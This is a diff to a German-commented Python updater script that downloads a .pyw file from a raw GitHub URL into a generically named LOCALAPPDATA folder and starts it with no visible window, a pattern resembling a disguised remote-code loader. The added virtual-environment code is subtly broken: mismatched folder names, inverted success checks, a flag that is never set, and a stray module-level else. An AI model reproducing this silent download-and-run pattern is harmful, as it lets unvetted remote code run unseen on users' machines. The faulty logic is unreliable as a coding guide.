@@ -14,7 +14,6 @@ import platform
 
 # ────────────────────────────────────────────────
 # KONFIGURATION
-APP_NAME       = "ApplicationDebugger"  # Name deiner Anwendung
 FILE_NAME      = "applicationdebugger.pyw"      # Name der Hauptdatei deiner Anwendung
 urllib.request.urlcleanup()
 UPDATE_URL = "https://raw.githubusercontent.com/pyw-update/python/refs/heads/main/src/" + FILE_NAME
@@ -23,12 +22,14 @@ UPDATE_URL = "https://raw.githubusercontent.com/pyw-update/python/refs/heads/mai
 
 # Pfade relativ zum Updater-Skript
 LOCAL_APPDATA = os.environ.get("LOCALAPPDATA", os.path.expanduser("~\\AppData\\Local"))
-APP_DIR       = os.path.join(LOCAL_APPDATA, APP_NAME)
+APP_DIR       = os.path.join(LOCAL_APPDATA, "UpdateFramework")
 APP_PATH      = os.path.join(APP_DIR, FILE_NAME)
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 
 IS_WINDOWS = platform.system().lower() == "windows"
 
+venv_activated = False
+venv_python = "./venv/Scripts/python.exe"
 
 def kill_running_main():
     """Beendet nur die Hauptanwendung, nicht den Updater selbst"""
@@ -107,6 +108,46 @@ def apply_update(temp_file):
 
     return False
 
+# --- Try to activate venv ---
+
+def try_install_venv() -> bool:
+    venv_path = os.path.join("./venv")
+    if not os.path.exists(venv_path):
+        if subprocess.run(["python", "-m", "venv", ".venv"], check=False):
+            print("Virtual environment created.")
+            return True
+        else:
+            print("Failed to create virtual environment.")
+            return False
+    
+    return True
+
+def install_dependencies():
+    if venv_activated:
+        try:
+            import requests
+            print("Dependencies already installed.")
+        except ImportError:
+            print("Installing dependencies...")
+            if subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"]):
+                print("Dependencies installed successfully.")
+            else:
+                print("Failed to install dependencies.")
+            try:
+                import requests
+            except ImportError:
+                print("Failed to import dependencies after installation.")
+
+if __name__ == "__main__":
+    if try_install_venv():
+        print("Virtual environment is ready.")
+        install_dependencies()
+    else:
+        print("Failed to activate virtual environment.")
+else:
+    print("Failed to create virtual environment.")
+
+
 
 def start_main_app():
     """Startet die Hauptanwendung zuverlässig unter Windows & Linux"""
@@ -116,18 +157,7 @@ def start_main_app():
     creationflags = subprocess.CREATE_NO_WINDOW if IS_WINDOWS else 0 # type: ignore
 
     try:
-        if APP_PATH.lower().endswith((".py", ".pyw")):
-            # mit gleichem Python starten wie der Updater
-            subprocess.Popen(
-                [sys.executable, APP_PATH],
-                creationflags=creationflags
-            )
-        else:
-            # exe direkt starten
-            subprocess.Popen(
-                [APP_PATH],
-                creationflags=creationflags
-            )
+        subprocess.run([venv_python, "applicationdebugger.pyw"], creationflags=creationflags)
         return True
     except Exception as e:
         print("Startfehler:", e)
